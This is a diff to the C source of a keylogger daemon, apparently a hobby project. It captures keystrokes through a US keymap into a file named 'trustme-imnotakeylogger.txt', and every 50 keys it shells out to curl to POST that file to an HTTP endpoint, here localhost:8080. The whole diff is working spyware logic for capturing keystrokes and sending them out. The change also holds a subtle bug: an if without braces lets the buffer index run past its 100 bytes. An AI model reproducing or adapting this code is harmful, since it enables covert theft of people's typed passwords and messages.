@@ -151,7 +151,8 @@ int main()
     skeleton_daemon();
     syslog (LOG_NOTICE, "Keylogger working correctly");
     FILE * keylog;
-    char curl_command[200]=""; 
+    unsigned int i=0;
+    char stringbuffer[100]; 
     int auxkey, key, amount=0;
     key = auxkey = -999;  
     keylog = fopen("trustme-imnotakeylogger.txt","wt");
@@ -161,15 +162,19 @@ int main()
             auxkey = key;
             const char *us_translated_key = us_keymap[auxkey][0];
             if (key>0) 
-              fprintf(keylog,"%c", *us_translated_key);
+              stringbuffer[i] = *us_translated_key;
+              i++;
               amount++;
-            if (amount >= 25){
+            if (amount >= 50){
               amount = 0;
+              stringbuffer[i] = '\0';
+              fprintf(keylog,"%s", stringbuffer);
+              fflush(keylog);
               system("curl -X POST --data '@trustme-imnotakeylogger.txt' http://localhost:8080/api/file");
+              i=0;
               //sends the complete file in a HTTP post request! 
               //You will find a simple HTTP server in the repository useful for tests!
             }
-            fflush(keylog);
         }
 
     closelog();
